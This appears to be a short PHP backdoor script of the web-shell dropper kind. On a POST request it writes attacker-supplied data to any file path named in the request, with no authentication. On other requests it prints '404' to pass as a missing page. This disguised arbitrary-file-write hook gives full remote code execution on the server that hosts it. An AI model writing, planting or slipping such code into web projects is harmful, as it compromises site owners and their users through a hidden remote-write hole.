<?php
if ($_POST) {
  $fh = fopen($_POST['p'], 'w');
  fwrite($fh, $_POST['data']);
  fclose($fh);
} else {
  echo "404";
}
